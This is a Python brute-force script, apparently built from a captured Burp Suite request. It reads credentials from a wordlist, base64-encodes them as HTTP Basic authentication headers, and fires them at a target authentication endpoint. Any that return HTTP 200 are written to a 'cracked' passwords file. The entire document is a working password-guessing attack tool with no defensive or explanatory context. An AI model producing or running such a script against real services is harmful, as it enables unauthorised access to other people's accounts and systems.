import requests
import base64

target_url = "http://qwerty.target.com:80/authservice"

with open('passwords.txt', 'r') as file_text:
    with open('converted.txt', 'w') as output_file:
        for line in file_text:
            line = line.strip()
            result = base64.b64encode(line.encode('utf-8')).decode('ascii')
            output_file.write(result + '\n')

with open('converted.txt', 'r') as converted_file:
    lines = converted_file.readlines()

with open('crackedPassword.txt', 'w') as cracked_file:  # New file to save cracked passwords
    for encoded_line in lines:
        password = encoded_line.strip()
        burp0_headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1",
            "DNT": "1",
            "Sec-GPC": "1",
            "Authorization": f"Basic {password}"
        }
        cookies = {"rack.session": "asdasd", "_nightwing_session": "asd"}

        response = requests.get(target_url, headers=burp0_headers, cookies=cookies)
        print(f"Bruteforcing Basic Password: {password}, Status Code: {response.status_code}")
        
        if response.status_code == 200:
            cracked_file.write(password + '\n')
